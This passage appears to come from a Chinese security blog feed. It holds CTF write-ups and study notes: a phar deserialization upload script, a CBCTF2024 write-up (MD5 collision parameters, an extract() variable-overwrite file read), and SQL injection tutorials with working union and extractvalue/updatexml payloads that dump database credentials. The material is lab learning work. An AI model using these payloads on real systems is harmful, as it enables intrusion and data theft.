class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://e12a0360-5b3b-412a-a898-6edf2af3f94a.training.0rays.club:8001/&quot;</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;phar.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>res = requests.post(url, files=&#123;<span class="hljs-string">&quot;user_note&quot;</span>:file&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>上传成功返回上传文件的重命名名称，最后利用 phar 伪协议 <code>phar://</code> 访问文件触发反序列化即可</p><p><code>http://（靶机）/index.php?note=phar:///notes/（重命名的文件名.txt）</code></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/2.png"></p><h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><h4 id="1-没搞清楚对象的层次结构导致链子构造错误"><a href="#1-没搞清楚对象的层次结构导致链子构造错误" class="headerlink" title="1.没搞清楚对象的层次结构导致链子构造错误"></a>1.没搞清楚对象的层次结构导致链子构造错误</h4><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/3.png" alt="修改前"></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/4.png" alt="修改后"></p><h4 id="2-题目看错"><a href="#2-题目看错" class="headerlink" title="2.题目看错"></a>2.题目看错</h4><p>取倒数 2<del>4 位，搞成倒数 1</del>3 位，如上图 mak4r1 均取值错误</p><h4 id="3-使用-phar-伪协议触发反序列化错误"><a href="#3-使用-phar-伪协议触发反序列化错误" class="headerlink" title="3.使用 phar 伪协议触发反序列化错误"></a>3.使用 phar 伪协议触发反序列化错误</h4><p>错误 <code>http://（靶机）/index.php?note=phar://notes/（重命名的文件名.txt）</code></p><p>正确 <code>http://（靶机）/index.php?note=phar:///notes/（重命名的文件名.txt）</code></p><p><code>/notes/（重命名的文件名.txt）</code> 才是正确的文件路径，用 <code>phar://</code> 伪协议包含要反序列化的文件</p><h3 id="官方-WP"><a href="#官方-WP" class="headerlink" title="官方 WP"></a>官方 WP</h3><p><a href="https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd">2024 CBCTF WriteUps</a></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/5.png"></p><h1 id="总结、感悟、收获"><a href="#总结、感悟、收获" class="headerlink" title="总结、感悟、收获"></a>总结、感悟、收获</h1><h2 id="1-如何理解链子的层层调用、对象的结构关系"><a href="#1-如何理解链子的层层调用、对象的结构关系" class="headerlink" title="1.如何理解链子的层层调用、对象的结构关系"></a>1.如何理解链子的层层调用、对象的结构关系</h2><p>既然叫链子，那么就要一环套一环，通过连续的自动调用来达到“利用原本无法利用的源码”的目的。然而，只有当前对象为包含某魔术方法的类的对象时，当前对象触发该魔术方法自动调用的条件，该魔术方法的自动调用才能生效。例如：_0rays 类下含有魔术方法__wakeup()，只有对象 ray 为_0rays 类时，对象 ray 被反序列化（触发调用条件），魔术方法__wakeup()被自动调用。</p><p>所以，要让链子依次调用魔术方法，那么<u>上一个对象</u>为上一个目标魔术方法所在的类的对象，<u>上一个对象的属性</u>为下一个目标魔术方法所在的类的对象，从而将一个个魔术方法链接起来。<u>形象地讲就是对象按对应魔术方法的调用顺序依次套娃。</u></p><blockquote><p>Tips:<br>因为我花了不少功夫才大致搞明白，所以写的比较详细且啰嗦，光看太绕了，最好结合前面 CBCTF2024 Notes2 调试时的变量结构图理解，调试一遍看一下。</p></blockquote><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p><a href="https://xz.aliyun.com/news/11953">https://xz.aliyun.com/news/11953</a></p><p><a href="https://cloud.tencent.com/developer/article/1945248">https://cloud.tencent.com/developer/article/1945248</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CBCTF2024 WP</title>
    <link href="/2025/01/24/CBCTF2024/"/>
    <url>/2025/01/24/CBCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="CBCTF2024-WP"><a href="#CBCTF2024-WP" class="headerlink" title="CBCTF2024 WP"></a>CBCTF2024 WP</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-SignIn"><a href="#1-SignIn" class="headerlink" title="1.SignIn"></a>1.SignIn</h2><p><img src="/img/CBCTF2024/1.png"></p><p>主要是 get 传参 a、b，参数本身的值不等，md5 的结果强比较相等，结合提示的置顶帖子即可。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br>&amp;<span class="hljs-attribute">b</span>=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br></code></pre></td></tr></table></figure><p>得到答案。</p><h2 id="2-Notes-1"><a href="#2-Notes-1" class="headerlink" title="2.Notes 1"></a>2.Notes 1</h2><p>一开始以为是路径穿越的题。</p><p>URL 尝试 <code>/notes_read.php?file=note3.txt</code> 时发现返回 <code>Error: File not found : /var/www/html/note3.txt</code> 也就得知访问的根目录在 <code>/var/www/html/</code>，通过 <code>/notes_read.php?file=...</code></p><p>传参读取该目录下的文件，因此访问 URL <code>/notes_read.php?file=notes_read.php</code> 就可以看到 notes_read.php 的源码。</p><p><img src="/img/CBCTF2024/2.png"></p><p>读完代码发现对于参数 <code>$file</code> 存在正则匹配，且实际读取文件的路径 <code>$filePath</code> 由 <code>$notes_directory</code> 和 <code>$file</code> 拼接而成，无法直接获取 <code>/flag</code>。而后发现 <code>extract()</code> 存在变量覆盖漏洞，所以传参 <code>/notes_read.php?file=flag&amp;notes_directory=/</code> 将变量 <code>$notes_directory</code> 的原内容覆盖，再拼接后即为&#x2F;flag 路径，读取到 flag。</p><h2 id="3-Notes-2"><a href="#3-Notes-2" class="headerlink" title="3.Notes 2"></a>3.Notes 2</h2><p>未完成</p><p>已有思路是反序列化后 <code>_0rays</code> 类下的 <code>__wakeup()</code> 先自动调用，而后 <code>__toString()</code>，<code>__set($a, $b)</code>，<code>__get($c)</code>，<code>__invoke()</code>，<code>__construct($filepath)</code>，最终 <code>readfile($filepath);</code> 获取 flag</p><p>但是实践起来还不熟练，没有做完。</p><p><img src="/img/CBCTF2024/3.png"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="阳光长跑"><a href="#阳光长跑" class="headerlink" title="阳光长跑"></a>阳光长跑</h2><p>补做了阳光长跑一题，主要考点是前后端的通信交互，用BP抓包发现开始跑步后浏览器向后端发送位置（经纬度）信息，推测后端根据位置信息的变化距离判断跑步长度，跑步时长由后端计算后返回，不受前端影响。</p><p>所以通过BP改变位置信息使距离达到要求然后再等时长到达合适的时间即可。</p><h2 id="Notes-2"><a href="#Notes-2" class="headerlink" title="Notes 2"></a>Notes 2</h2><p>该题为基础 PHP 反序列化，思路同上所述，具体参考我的另一篇博文<a href="https://5i1encee.top/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93">PHP反序列化小结</a></p><p><a href="https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd">官方WP</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 学习笔记</title>
    <link href="/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-学习笔记"><a href="#SQL-学习笔记" class="headerlink" title="SQL 学习笔记"></a>SQL 学习笔记</h1><h1 id="SQL-学习笔记-1"><a href="#SQL-学习笔记-1" class="headerlink" title="SQL 学习笔记"></a>SQL 学习笔记</h1><p>本篇笔记内容与 B 站课程 <a href="https://www.bilibili.com/video/BV1c34y1h7So?spm_id_from=333.1245.0.0">SQL 注入由简入精</a>基本一致，为知识点和个人心得总结。</p><h1 id="sqli-labs-靶场搭建"><a href="#sqli-labs-靶场搭建" class="headerlink" title="sqli-labs 靶场搭建"></a>sqli-labs 靶场搭建</h1><ol><li>下载 phpstudy</li><li>github 上下载 sqli-labs 环境复制到 phpstudy 根目录下</li></ol><h1 id="SQL-基础常用语法语句"><a href="#SQL-基础常用语法语句" class="headerlink" title="SQL 基础常用语法语句"></a>SQL 基础常用语法语句</h1><h2 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p><code>show databases;</code></p><p>（根目录下输入）查看数据库</p><p><code>create database employees charset utf8;</code></p><p>创建数据库 employees 并选择字符集</p><p><code>drop database employees;</code></p><p>删除数据库 employees</p><p><code>use employees;</code></p><p>选择进入数据库 employees</p><h3 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee<br>(<br>id <span class="hljs-type">int</span>,<br><span class="hljs-type">name</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">40</span>),<br>sex <span class="hljs-type">char</span>(<span class="hljs-number">4</span>),<br>birthday data,<br>job <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)<br>);<br></code></pre></td></tr></table></figure><p>创建数据表 employee，必须设定列</p><p><code>drop table employee;</code></p><p>删除数据表</p><p><code>rename table employee to user;</code></p><p>修改数据表名称为 user</p><p><code>alter table user character set utf8;</code></p><p>修改字符集</p><h3 id="数据列和数据行"><a href="#数据列和数据行" class="headerlink" title="数据列和数据行"></a>数据列和数据行</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span><br>(<br>    id,<span class="hljs-type">name</span>,sex,birthday,job)<br><span class="hljs-keyword">values</span><br>(<br>    <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ctfstu&#x27;</span>,<span class="hljs-string">&#x27;male&#x27;</span>,<span class="hljs-string">&#x27;1999-05-06&#x27;</span>,<span class="hljs-string">&#x27;IT&#x27;</span>)<br>;<br></code></pre></td></tr></table></figure><p>写入内容</p><p><code>alter table user add salary decimal(8,2);</code></p><p>增加一列内容 salary，最大 8 位，小数点后保留 2 位</p><p><code>update user set salary=5000;</code></p><p>修改所有工资为 5000</p><p><code>update user set name=&#39;benben&#39; where id=1;</code></p><p>修改 id&#x3D;1 的行 name 为 benben</p><p><code>update user set name=&#39;benben2&#39;,salary=3000 where id=1;</code></p><p>修改 id&#x3D;1 的行 name 为 benben2，工资为 3000</p><p><code>alter table user drop salary;</code></p><p>删除指定列</p><p><code>delete from user where job=&#39;IT&#39;;</code></p><p>删除指定行</p><p><code>delete from user;</code></p><p>删除表中所有数据（不删除表的结构）</p><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>基础查询词：</p><p><code>select</code>，<code>from</code>，<code>where</code></p><p>查询参数指令：</p><p><code>union</code>，<code>group by</code>，<code>order by</code>，<code>limit</code>，<code>and</code>，<code>or</code></p><p>常用函数：</p><p><code>group_concat()</code>，<code>database()</code>，<code>version()</code></p><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p><code>select * from user where id=1;</code></p><p>select+ 列名（*代表所有）+from+ 表名（user）+where+ 条件语句（id&#x3D;1）+;</p><p><code>select * from user where id in (&#39;1&#39;);</code></p><p>在 user 表中查询所有包含 id 为 1 的数据</p><p><code>select * from user where id=(select id from user where username=(&#39;admin&#39;));</code></p><p>子查询，优先执行()内语句</p><h3 id="查询参数指令"><a href="#查询参数指令" class="headerlink" title="查询参数指令"></a>查询参数指令</h3><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p><code>select id from user union select email_id from emails;</code></p><p>查询并合并数据显示</p><p><code>select * from user where id=6 union select * from emails where id=6;</code>（错误示例）</p><p>返回 <code>ERROR: have a different number of columns</code> 联合注入 union 左右表格列数必须相等，此例 user 有 3 列，emails 有 2 列</p><p><code>select * from user where id=6 union select *,3 from emails where id=6;</code>（正确示例）</p><p>由于 union 右比左少一列，因此用 3 作为填充列，使左右列数相等，查询结果 emails 部分第三列数据即为 3</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>本身实现的是分组功能但也可用于判断列数。由于存在一些问题不推荐常用，例如：user 表中有两条相同姓名不同 id 的数据，只对一列分组可以，对多列分组会报错。一些防火墙过滤可能不严格，可以方便利用。</p><p><code>select username from user group by username;</code></p><p>在 user 表中查询 username 列，按 username 分组输出</p><p><code>select username from user group by 1;</code></p><p>同上输出，username 仅一列，本句查询按第一列分组</p><p><code>select username from user group by 2;</code></p><p>报错，username 仅一列，本句查询按第二列分组，不存在第二列</p><p><code>select * from user group by 2;</code></p><p>正常输出，user 表三列数据，按 user 表内第二列分组。</p><p>想要判断列数则可以根据以上原理从 2 开始 3、4、5······往后尝试，当出现报错时的数-1 即为列数</p><p>实际 SQL 注入时使用二分法，先取一个足够大会返回报错的数，而后不断取半（中间数），直到找到边界。</p><p>例如 <code>select * from user where id=1 group by 10;</code> 10-&gt;5-&gt;3-&gt;4</p><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>本身实现的是排序，同 group by 可用于判断列数</p><p><code>select * from user order by id;</code></p><p>在 user 表中按 id 升序排序</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id;</code></p><p>可在 order by 前加入 where 条件</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id desc;</code></p><p>order by 的排序默认升序，在后面加 desc 改为降序</p><p><code>select * from user order by 1;</code></p><p>同 group by 一样可按第几列排序，判断列数方法同样相似</p><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>限制输出内容数量，一般用于报错注入，限数显示报错反馈信息</p><p><code>select * from user limit 0,3;</code></p><p>限制为从第 1 行开始显示 3 行，在这里实际的第一行就是命令里的第 0 行</p><p>当回显内容有限想查看同一级其他数据时可以在语句后加上 <code>limit 0,1</code>，<code>limit1,1</code>，<code>limit2,1</code> 等等</p><h4 id="and-or"><a href="#and-or" class="headerlink" title="and &amp; or"></a>and &amp; or</h4><p>即“与”和“或”。额算是比较重要但也没什么好说的。</p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>将多行合并拼接至一行显示（并用指定分隔符分隔），在 union 注入及报错注入时 group_concat 尤为重要</p><p><code>select group_concat(id,username,password) from user;</code></p><p>将 user 表内的 id，username，password 合并在一行输出</p><p>当遇到限制回显数量只有一条时，就可以用 <code>group_concat()</code> 较方便的一次性获得所有内容，例如 <code>group_concat(table_name)</code>，比 <code>limit</code> 一条一条查更方便。但是如果源码当中显示位数设置较少的话这种方法就可能导致显示不全，用 <code>limit</code> 则更加稳妥</p><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>效果与 group_concat()类似，是将任意长度的多个字符串拼接成一个字符串，在报错注入时也是尤为重要</p><h4 id="select-database"><a href="#select-database" class="headerlink" title="select database()"></a>select database()</h4><p>查看当前数据库名称</p><h4 id="select-version"><a href="#select-version" class="headerlink" title="select version()"></a>select version()</h4><p>查看当前数据库版本，防火墙绕过时用得到，方便找到对应版本的漏洞</p><h1 id="SQL-注入基础"><a href="#SQL-注入基础" class="headerlink" title="SQL 注入基础"></a>SQL 注入基础</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>SQL 注入就是通过构造一条精巧的 SQL 命令语句来查询得到想要的信息。</p><p>注入点即可以实现输入的地方，通常是一个访问数据库的连接。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>按查询字段分：</p><p>数字型，输入参数为整型</p><p>字符型，输入参数为字符串（被单引号闭合）</p><p>按注入方法分：<br>union 注入、报错注入、布尔注入、时间注入</p><h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><h3 id="数字型-or-字符型？"><a href="#数字型-or-字符型？" class="headerlink" title="数字型 or 字符型？"></a>数字型 or 字符型？</h3><p>数字型提交内容一般为数字，但<u>数字不一定是数字型</u>，<u>数字型不需要闭合符来闭合</u></p><p>字符型提交内容则需要<u>闭合符闭合</u></p><p>1.使用 <code>and 1=1</code> 和 <code>and 1=2</code> 来判断</p><p>如果为数字型，前者照常显示返回信息，后者不会显示，因为 1 与 2 不等</p><p>如果为字符型，两者都能正常显示信息，相当于输入内容均被单引号包裹，and 不作为命令执行</p><p>2.使用(?id)<code>=2-1</code> 来判断</p><p>如果为数字型则返回的是 <code>?id=1</code> 的内容</p><p>如果为字符型则无法计算，返回为 <code>?id=2</code> 的内容</p><p>不推荐用 <code>+</code>，因为 URL 编码通常用 <code>+</code> 和 <code>%20</code> 代替空格，解码时相应会被解码成空格</p><h3 id="若字符型则闭合方式？"><a href="#若字符型则闭合方式？" class="headerlink" title="若字符型则闭合方式？"></a>若字符型则闭合方式？</h3><p>常见闭合方式：</p><p><code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>、其他</p><p>1.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&#39;......</code>，多了一个 <code>&#39;</code> 则闭合符为 <code>&#39;</code></p><p>2.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&quot;......</code>，多了一个 <code>&quot;</code> 则闭合符为 <code>&quot;</code></p><p>3.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&#39;)......</code>，多了一个 <code>&#39;)</code> 则闭合符为 <code>&#39;)</code></p><p>4.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&quot;)......</code>，多了一个 <code>&quot;)</code> 则闭合符为 <code>&quot;)</code></p><p>即尝试输入内容中的闭合符与输入内容前的闭合符闭合，输入内容后原本的闭合符则会变得多余，从而报错，我们根据报错得到命令当中所用的闭合符</p><p>闭合的作用：</p><p>结束前一段查询语句，在后面可加入其他语句，查询需要的参数</p><p>后面不需要的语句可以用注释符 <code>--+</code>（此处跟的 <code>+</code> 实际是代替空格，避免直接输入空格被忽略，也可以通过在空格后随便加上一些内容避免这个问题，例如 <code>-- abc</code>）、<code>#</code>、<code>%23</code> 注释掉</p><h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>用二分法判断默认页面数据列数量，参考前面的 union、group by、order by 内容，再使用联合注入获得目标结果</p><p>但是页面只能显示一个内容，union 后的语句查询的内容是不显示的，因此为了显示想要的内容，可以将前一句查询的内容改为数据库中原本不存在的数据，如 <code>id=-1</code>，那么前面一句查询不到结果就只会显示后面一句查询的结果</p><p>此外并非每一列的内容都会回显，要先判断会回显的是哪些列。例如 sqli-labs 的 less-1，注入 <code>?id=-1&#39; union select 1,2,3--+</code>，会回显的是 2、3，因此我们可以二三两列位置换成其他想要的内容，例如 <code>?id=-1&#39; union select 1,version(),database()--+</code></p><p>注入步骤：</p><p>1.查找注入点</p><p>2.判断字符型还是数字型</p><p>3.若是字符型则找到其闭合方式</p><p>4.判断查询列数 group by&#x2F;order by</p><p>5.查询回显位置</p><p>而后可参考这篇小结查询所需信息</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>有时尝试 union 联合注入发现语句正确但无对应回显，而输入错误语句时仍会有报错回显，那么就可以尝试报错注入</p><p>报错注入的基础是后台对于输入输出的合理性未做检测</p><p>报错注入的实现就是构造语句让错误语句中夹杂可以显示数据库内容的查询语句，使得返回的报错提示中包含数据库中的内容</p><h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h3><p>extractvalue()函数包含两个参数：XML 文档对象名称、路径</p><p>根据以下例子了解该函数用法</p><p>1、先在 ctfstu 数据库内创建表 xml</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database ctfstu charset utf8;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> xml(doc <span class="hljs-type">varchar</span>(<span class="hljs-number">150</span>));<br></code></pre></td></tr></table></figure><p>2、在表内插入两段数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;A bad boy how to get a</span><br><span class="hljs-string">girlfriend&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;Love&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;benben&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;how to become a bad boy&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;hualong&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><p>3、使用 extractValue()查询 xml 内的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/author/surname&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #查询作者<br><br>返回：<br>benben<br>Melton<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/title&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #查询书名<br><br>返回：<br>A bad boy how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> a girlfried<br>how <span class="hljs-keyword">to</span> become a bad boy<br></code></pre></td></tr></table></figure><p>4、写错查询参数中的路径</p><p>例如 <code>select extractvalue(doc,&#39;/book/titlelll&#39;)from xml;</code></p><p>结果查询不到内容但是也不会报错</p><p>5、写错查询参数的格式符号</p><p>例如 <code>select extractvalue(doc,&#39;~book/title&#39;)from xml;</code></p><p>显示报错信息 <code>#1105 - XPATH syntax error: &#39;~book/title&#39;</code></p><p>至此我们发现当写错查询参数的格式符号时会有报错返回，显示我们写错的路径。因此我们或许可以尝试在报错之前查询所需信息通过报错返回查看查询结果。</p><p>例如 <code>select extractvalue(doc,concat(0x7e,(select database()))) from xml;</code>，括号内的语句 <code>select database()</code> 优先执行，然后查询结果通过 <code>concat()</code> 函数与 <code>~</code> 符号拼接在一起作为 <code>extractvalue()</code> 函数的路径参数，最后因为格式不符规范，后台返回报错信息，而报错信息中包含“错误路径”也就是我们故意构造的查询语句的查询结果。至此，一次报错注入完成。想要查询其他内容只需要将相应的查询语句替换进 <code>select database()</code> 所在位置。</p><p>实际在运用这种报错注入时通过 <code>union select ......</code> 或者 <code>and 1=......</code> 注入均可，只要最终报错即可</p><p>例如 <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users))) --+</code></p><p>然而报错注入还受到一个限制，<code>extractvalue()</code> 默认只能返回 32 个字符串，有时就会显示不全。对此的解决方法是运用 <code>substring(str,num1,num2)</code> 函数，其中 str 是操作的目标字符串，num1 是起始位置，num2 是截取个数，实现的效果就是显示字符串 str 从第 num1 位起 num2 个字符长度的字符串</p><p>例如 <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30) from users))) --+</code></p><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h3><p>updatexml()函数包含三个参数：XML 文档对象名称、路径、要替换的新数据</p><p>该函数的功能就是更新替换 XML 文档中的指定内容</p><p>该函数的报错原理与 extractvalue()一样，输入带错误符号的第二个参数。该函数也同样存在 32 位的限制，同样参考 extractvalue()用 substring()解决</p><h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 爆库名表名列名数据小结</title>
    <link href="/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/"/>
    <url>/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-爆库名表名列名数据小结"><a href="#SQL-爆库名表名列名数据小结" class="headerlink" title="SQL 爆库名表名列名数据小结"></a>SQL 爆库名表名列名数据小结</h1><p>本篇以 BUUCTF-[极客大挑战 2019]BabySQL 1 为例，但不涉及该题详细内容</p><p>题中涉及到双写绕过关键字过滤，在以下不做考虑，仅借用本题场景</p><p>1.通过 <code>order by</code> 判断得出数据表为 3 列，并测试得回显 2、3</p><p>2.获取所有库名 <code>1&#39; union select 1,database(),group_concat(schema_name) from information_schema.schemata #</code> 得到 geek 以及 information_schema,mysql,performance_schema,test,ctf,geek</p><p>3.获取 geek 库中的表名 <code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; #</code> 得到 b4bsql,geekuser</p><p>4.获取 geekuser 中的列名 <code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39; #</code> 得到 id,username,password</p><p>5.获取数据 <code>1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.geekuser #</code> 其中 <code>concat_ws()</code> 函数的功能是指定参数之间的分隔符，<code>0x7e</code> 即为 <code>~</code>，非必须，from 后的格式为“库名.表名”</p><p>参考：<a href="https://www.cnblogs.com/xiaobai141/p/14160758.html">https://www.cnblogs.com/xiaobai141/p/14160758.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2024 WP</title>
    <link href="/2024/07/03/Hgame2024/"/>
    <url>/2024/07/03/Hgame2024/</url>
    
